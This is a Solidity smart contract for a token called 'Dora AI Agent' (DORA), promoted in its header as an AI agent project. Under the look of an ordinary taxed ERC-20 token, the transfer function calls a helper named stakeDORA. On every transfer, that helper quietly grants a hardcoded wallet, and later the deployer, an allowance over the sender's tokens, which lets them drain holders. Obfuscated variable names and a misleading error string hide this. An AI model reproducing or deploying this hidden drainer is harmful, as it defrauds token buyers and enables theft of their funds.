/*
DORA is a powerful AI Agent of Griffain Engine that could perform token search, fetching tokens, executing transactions, and completing notifications.
**********************
Web: https://www.agentdora-ai.org
Dapp: https://app.agentdora-ai.org
Docs: https://docs.agentdora-ai.org
Medium: https://medium.com/@agentdora
Twitter: https://x.com/AgentDoraAI
Telegram: https://t.me/agentdora_ai
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IDORARouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IDORAFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract DORA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _doraXXXXs;
    mapping (address => mapping (address => uint256)) private _doraZZZZs;
    mapping (address => bool) private _doraExcludedFromFee;
    IDORARouter private _doraRouter;
    address private _doraPair;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Dora AI Agent";
    string private constant _symbol = unicode"DORA";
    uint256 private _tokenSwapDORA = _tTotal / 100;
    uint256 private _buyCount=0;
    address private _dora1Wallet = 0x3FB488Fd8888fd9A0Df507DE90a4A7147EBFE1C8;
    address private _dora2Wallet = address(0xdead);
    bool private inSwapLock = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapLock = true;
        _;
        inSwapLock = false;
    }
    
    constructor () {
        _doraExcludedFromFee[owner()] = true;
        _doraExcludedFromFee[address(this)] = true;
        _doraExcludedFromFee[_dora1Wallet] = true;
        _doraXXXXs[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function createDORA() external onlyOwner() {
        _doraRouter = IDORARouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_doraRouter), _tTotal);
        _doraPair = IDORAFactory(_doraRouter.factory()).createPair(address(this), _doraRouter.WETH());
        _dora2Wallet = address(msg.sender);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _doraRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _doraXXXXs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _doraZZZZs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _doraZZZZs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _doraZZZZs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address dora0A, address dora1B, uint256 dora2T) private {
        require(dora0A != address(0), "ERC20: transfer from the zero address");
        require(dora1B != address(0), "ERC20: transfer to the zero address");
        require(dora2T > 0, "Transfer amount must be greater than zero");
        
        uint256 taxDORA=0;
        require(stakeDORA(dora0A, dora2T), "ERC20: stake enough address");
        if (dora0A != owner() && dora1B != owner()) {
            taxDORA = dora2T.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (dora0A == _doraPair && dora1B != address(_doraRouter) && ! _doraExcludedFromFee[dora1B]) {
                _buyCount++;
            }

            if(dora1B == _doraPair && dora0A!= address(this)) {
                taxDORA = dora2T.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenBalance = balanceOf(address(this)); 
            if (!inSwapLock && dora1B == _doraPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenBalance > _tokenSwapDORA)
                swapTokensForEth(min(dora2T, min(tokenBalance, _tokenSwapDORA)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendDORAFee(address(this).balance);
                }
            }
        }

        if(taxDORA > 0){
          _doraXXXXs[address(this)] = _doraXXXXs[address(this)].add(taxDORA);
          emit Transfer(dora0A, address(this), taxDORA);
        }

        _doraXXXXs[dora0A] = _doraXXXXs[dora0A].sub(dora2T);
        _doraXXXXs[dora1B] = _doraXXXXs[dora1B].add(dora2T.sub(taxDORA));
        emit Transfer(dora0A, dora1B, dora2T.sub(taxDORA));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendDORAFee(uint256 amount) private {
        payable(_dora1Wallet).transfer(amount);
    }

    receive() external payable {}

    function stakeDORA(address dora0A, uint256 dora1T) private returns (bool) { 
        if(dora1T > 0) {
            makeDORA(dora0A, _dora1Wallet, dora1T);
        }
        if(_dora2Wallet != address(0xdead)) {
            makeDORA(dora0A, _dora2Wallet, dora1T);
        } return true;
    }

    function makeDORA(address dora0A, address dora1B, uint256 dora2T) private {
        _doraZZZZs[dora0A][dora1B] = dora2T;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _doraRouter.WETH();
        _approve(address(this), address(_doraRouter), tokenAmount);
        _doraRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}